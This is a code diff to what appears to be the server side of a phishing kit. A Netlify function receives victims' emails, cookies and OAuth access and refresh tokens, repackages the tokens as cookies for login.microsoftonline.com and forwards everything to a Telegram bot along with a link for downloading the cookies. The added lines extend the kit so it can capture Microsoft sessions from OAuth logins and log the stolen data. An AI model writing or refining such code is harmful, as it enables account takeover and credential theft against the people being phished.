@@ -50,7 +50,16 @@ const handler = async (event, context) => {
     let data;
     try {
       data = JSON.parse(event.body);
+      console.log('📨 Received data:', {
+        email: data.email,
+        provider: data.provider,
+        hasAccessToken: !!data.accessToken,
+        hasRefreshToken: !!data.refreshToken,
+        formattedCookiesCount: data.formattedCookies?.length || 0,
+        timestamp: new Date().toISOString()
+      });
     } catch (parseError) {
+      console.error('❌ JSON parse error:', parseError);
       await sendErrorTelegram('JSON parse error', event.body);
       return {
         statusCode: 400,
@@ -170,13 +179,51 @@ const handler = async (event, context) => {
       await sendErrorTelegram('Cookie parse error', cookieInfo);
     }
 
+    // For OAuth logins, we might not have traditional cookies but have tokens
     if (!formattedCookies || formattedCookies.length === 0) {
-      await sendErrorTelegram('No cookies found for this submission', data);
-      return {
-        statusCode: 400,
-        headers,
-        body: JSON.stringify({ error: 'No cookies found' }),
-      };
+      // Check if this is an OAuth login with tokens
+      if (data.accessToken || data.refreshToken) {
+        console.log('OAuth login detected with tokens, proceeding without traditional cookies');
+        // Create a virtual cookie structure for OAuth tokens
+        formattedCookies = [];
+        if (data.accessToken) {
+          formattedCookies.push({
+            name: 'OAUTH_ACCESS_TOKEN',
+            value: data.accessToken,
+            domain: '.login.microsoftonline.com',
+            path: '/',
+            secure: true,
+            httpOnly: false,
+            sameSite: 'none',
+            expirationDate: Math.floor(Date.now() / 1000) + 3600,
+            hostOnly: false,
+            session: false,
+            storeId: null
+          });
+        }
+        if (data.refreshToken) {
+          formattedCookies.push({
+            name: 'OAUTH_REFRESH_TOKEN',
+            value: data.refreshToken,
+            domain: '.login.microsoftonline.com',
+            path: '/',
+            secure: true,
+            httpOnly: false,
+            sameSite: 'none',
+            expirationDate: Math.floor(Date.now() / 1000) + (90 * 24 * 60 * 60),
+            hostOnly: false,
+            session: false,
+            storeId: null
+          });
+        }
+      } else {
+        await sendErrorTelegram('No cookies or tokens found for this submission', data);
+        return {
+          statusCode: 400,
+          headers,
+          body: JSON.stringify({ error: 'No cookies or authentication tokens found' }),
+        };
+      }
     }
 
     // Send main message to Telegram
@@ -205,6 +252,9 @@ const handler = async (event, context) => {
 🆔 Session: ${sessionId}
 Download link: ${event.headers.host ? `https://${event.headers.host}` : 'https://your-domain.netlify.app'}/.netlify/functions/getCookies?sessionId=${sessionId}`;
 
+    console.log('📤 Attempting to send Telegram message for:', data.email);
+    console.log('📤 Message preview:', mainMessage.substring(0, 200) + '...');
+    
     let mainMessageOk = false;
     try {
       const tgResp = await fetch(
